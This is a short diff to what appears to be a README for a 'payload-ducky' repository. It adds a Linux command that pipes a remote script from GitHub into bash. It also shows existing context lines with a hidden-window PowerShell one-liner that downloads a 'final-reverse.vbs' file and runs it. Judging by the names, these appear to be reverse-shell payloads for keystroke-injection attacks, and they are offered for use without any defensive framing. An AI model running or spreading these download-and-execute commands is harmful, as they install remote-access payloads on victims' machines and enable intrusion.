@@ -9,3 +9,8 @@ irm https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/fin
 powershell -w hidden -c "iwr 'https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/final-reverse.vbs' -OutFile $env:TEMP\r.vbs; & wscript $env:TEMP\r.vbs"
 
 ```
+
+## use the following command in linux terminal(debian tested)
+```
+curl -fsSL https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/linux.sh | bash
+```
